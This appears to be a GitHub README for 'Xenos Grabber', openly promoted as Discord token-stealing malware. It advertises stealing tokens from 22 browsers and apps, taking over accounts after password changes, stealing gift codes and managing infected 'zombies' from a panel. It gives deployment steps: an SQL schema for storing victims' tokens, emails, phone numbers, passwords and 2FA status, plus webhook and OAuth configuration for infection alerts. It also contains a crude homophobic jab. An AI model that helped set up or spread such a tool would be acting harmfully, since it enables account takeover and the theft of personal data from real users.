<div align="center">
  <h2>🐺 Xenos Grabber 🐺</h2>
  <p>The most powerfull Discord Token Grabber</p>
  <a href="https://kanekiweb.tk/discord" target="_blank">Join my Discord Serveur</a><br><br>

  <img src="https://kanekiweb.tk/assets/img/xenos.gif" style="width: 600px; height: 400px;">
</div>

<br><br><br>

## Features
- Infinite Discord Webhook (Can't delete it)
- Use and view your zombies on the panel
- Use our api for manager your zombies
- Xenos uses the discord login system as well as a whitelist of ids 
- Our grabber get the tokens on 22 Applications/Browsers
- Recover the account information even if the person changes the password
- Steal all the gifts that the user has
- Detect Flagged/Working Tokens

## How to use Xenos
- If you're gay you can follow step by step this tutorial: https://youtube.com/
- Else follow Step by Step that:
  - You need a website to host the files (you can use 000webhost)
  - In the phpmyadmin of your website, create a database, then click on it and select above the SQL category, once all that done paste the code below and click on execute.
```sql
CREATE TABLE `gifts` (
  `id` int(11) NOT NULL,
  `gift_name` varchar(100) NOT NULL,
  `start_date` varchar(100) NOT NULL,
  `end_date` varchar(100) NOT NULL,
  `code` varchar(100) NOT NULL,
  `claim_at` varchar(100) NOT NULL,
  `steal_date` datetime NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE `tokens` (
  `user_id` text NOT NULL,
  `username` text NOT NULL,
  `avatar` text NOT NULL,
  `email` text NOT NULL,
  `phone` text NOT NULL,
  `badges` int(10) NOT NULL,
  `nitro_badges` int(10) NOT NULL,
  `twofactor` varchar(100) NOT NULL,
  `token` text NOT NULL,
  `isflaged` int(10) NOT NULL,
  `password` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

ALTER TABLE `gifts`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `gifts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
COMMIT;
```
- - Then go to `Inc/database.php` and put your __hostname, database, username, password__
  - Open `Inc/fonctions.php` and put:
    - At line 5 replace `PASSWORD FOR API` by a **password** for using our api and remove a token
    - At line 6 replace `YOUR DISCORD WEBHOOK` by your webhook for receive notifications when your infect a user
    - At line 9 & 10 Go to https://discord.com/developers then create an applcation
    - In Click on your application in Oauth2 Section Copy the Client ID and Client Secret
    - At line 11 replace `yoursite.com` by your website url and on https://discord.com/developers on your application in oauth section create a redirect and paste `http://yoursite.com/async/login` *(with your website please your are not stupid)*
    - For end just add your id at the line 12, for each id separated by `,` <br>(exemple: `array("922450497074495539", "957329295603269652")`)

- Put a stars and follow me for more ❤️

### Grabber Demo:
> ![](https://cdn.discordapp.com/attachments/931632899709620254/965005206209302528/unknown.png)
### Connection Notification Demo:
> ![](https://cdn.discordapp.com/attachments/931632899709620254/965018184325402675/unknown.png)
### Home Page Demo:
> ![](https://media.discordapp.net/attachments/931632899709620254/965018381138931712/unknown.png?width=1394&height=682)

<p align="center">
  <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat" alt="Contribution Welcome">
  <img src="https://img.shields.io/badge/License-GPLv3-blue.svg" alt="License Badge">
  <img src="https://badges.frapsoft.com/os/v3/open-source.svg?v=103" alt="Open Source">
  <img src="https://visitor-badge.laobi.icu/badge?page_id=KanekiWeb.Xenos" alt="Visitor Count">
</p>
